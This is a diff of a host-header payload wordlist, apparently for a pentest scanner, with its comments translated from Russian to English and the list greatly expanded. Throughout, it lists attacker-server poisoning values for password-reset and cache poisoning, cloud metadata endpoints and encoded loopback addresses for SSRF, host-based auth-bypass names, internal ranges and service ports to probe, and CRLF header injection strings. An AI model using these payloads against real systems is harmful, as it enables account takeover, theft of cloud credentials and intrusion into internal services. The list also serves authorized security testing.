@@ -1,13 +1,17 @@
 # host-values.txt
-# Значения, которые подставляются в host-заголовки (режим -mode host).
-# Плейсхолдеры:
-#   {{OOB}}    -> interactsh-домен с уникальным префиксом (blind-детект)
-#   {{LHOST}}  -> твой IP/домен (флаг -lhost)
-#   {{TARGET}} -> внутренний таргет (флаг -itarget, по умолчанию 127.0.0.1)
-#   {{COLLAB}} -> алиас {{OOB}}
-# Строки с # и пустые игнорируются.
+# Values injected into host headers (-mode host).
+# Placeholders:
+#   {{EVIL}}   -> YOUR server for host poisoning (flag -evil; if unset but -oob
+#                 is set, a unique interactsh subdomain is used so hits show up
+#                 directly in interactsh; otherwise the payload is skipped)
+#   {{HOST}}   -> legitimate target host without port (from Host header or -url)
+#   {{OOB}}    -> interactsh subdomain with unique prefix (blind detection)
+#   {{LHOST}}  -> your IP/domain (flag -lhost)
+#   {{TARGET}} -> internal target (flag -itarget, default 127.0.0.1)
+#   {{COLLAB}} -> alias of {{OOB}}
+# Lines starting with # and blank lines are ignored.
 
-# ---------- Loopback ----------
+# ========== SSRF / ACL-bypass values (internal addresses) ==========
 127.0.0.1
 127.0.0.1:80
 127.0.0.1:443
@@ -19,21 +23,118 @@ localhost:80
 2130706433
 0x7f000001
 0177.0.0.1
-
-# ---------- OOB / blind (password-reset poisoning, cache poisoning) ----------
-{{OOB}}
-{{LHOST}}
-evil.{{OOB}}
-
-# ---------- Внутренние таргеты ----------
 {{TARGET}}
 169.254.169.254
 metadata.google.internal
 100.100.100.200
 
-# ---------- Инъекции в значение (CRLF / port / path) ----------
-127.0.0.1:80
-127.0.0.1 127.0.0.1
-localhost#.evil.com
-localhost%0d%0aX-Injected:1
-127.0.0.1%0d%0a
+# ========== Host-Header poisoning: redirect to YOUR server ==========
+# (password-reset poisoning, web-cache poisoning, routing-based SSRF)
+{{EVIL}}
+evil.{{EVIL}}
+{{LHOST}}
+{{OOB}}
+
+# ========== Port injection ({{HOST}} = target, {{EVIL}} = your server) ==========
+{{HOST}}:@{{EVIL}}
+{{HOST}}:{{EVIL}}
+{{HOST}}:80@{{EVIL}}
+{{HOST}} {{EVIL}}
+{{HOST}}@{{EVIL}}
+
+# ========== Subdomain / suffix (bypass "domain contains legit" checks) ==========
+{{EVIL}}.{{HOST}}
+{{HOST}}.{{EVIL}}
+{{HOST}}#.{{EVIL}}
+{{HOST}}.{{EVIL}}.{{HOST}}
+
+# ========== IP-encoding bypasses in bare-host form ==========
+# (applied to every override header; URLs/schemes/paths live in ssrf mode)
+# Shorthand / dotless
+127.1
+127.0.1
+0
+# Decimal
+3232235521
+3232235777
+2852039166
+16843009
+# Octal
+0177.0.0.1
+0177.00.00.01
+o177.0.0.1
+0o177.0.0.1
+# Hex
+0x7f000001
+0x7f.0.0.1
+0xc0a80101
+0xa9fea9fe
+# Mixed base
+0x7f.0.0.1
+0177.0.0.0x1
+127.0.0.01
+# IPv6 embeddings
+[0:0:0:0:0:ffff:127.0.0.1]
+[::ffff:127.0.0.1]
+[::ffff:7f00:1]
+[0:0:0:0:0:ffff:169.254.169.254]
+# CIDR 127.0.0.0/8
+127.0.0.2
+127.1.1.1
+127.127.127.127
+# Trailing dot / case
+127.0.0.1.
+LOCALHOST
+# Wildcard DNS
+127.0.0.1.nip.io
+localtest.me
+localh.st
+169.254.169.254.nip.io
+# Metadata hosts (bare)
+metadata
+169.254.170.2
+
+# ========== Auth bypass (server trusts "local" by Host) ==========
+# Check all variants - validation is often a plain string match.
+internal
+intranet
+admin
+admin.local
+localhost.localdomain
+local
+
+# ========== Routing-based SSRF (reverse proxy routes by Host) ==========
+# Common gateways / first hosts of private ranges. A full /8 sweep is NOT
+# included on purpose (tens of thousands of requests, DoS risk) - extend per
+# target network yourself and keep -rate low. See also the -sweep flag.
+# 192.168.0.0/16
+192.168.0.1
+192.168.0.254
+192.168.1.1
+192.168.1.254
+192.168.1.2
+192.168.100.1
+# 10.0.0.0/8
+10.0.0.1
+10.0.0.254
+10.0.1.1
+10.10.10.1
+10.1.1.1
+# 172.16.0.0/12
+172.16.0.1
+172.16.0.254
+172.17.0.1
+172.31.255.254
+# Common internal services
+192.168.0.1:8080
+10.0.0.1:8080
+172.17.0.1:2375
+127.0.0.1:8500
+127.0.0.1:2379
+127.0.0.1:9200
+127.0.0.1:5000
+
+# ========== Value injection (CRLF / path) ==========
+{{EVIL}}%0d%0aX-Injected:1
+{{HOST}}%0d%0aHost:{{EVIL}}
+{{HOST}}/{{EVIL}}
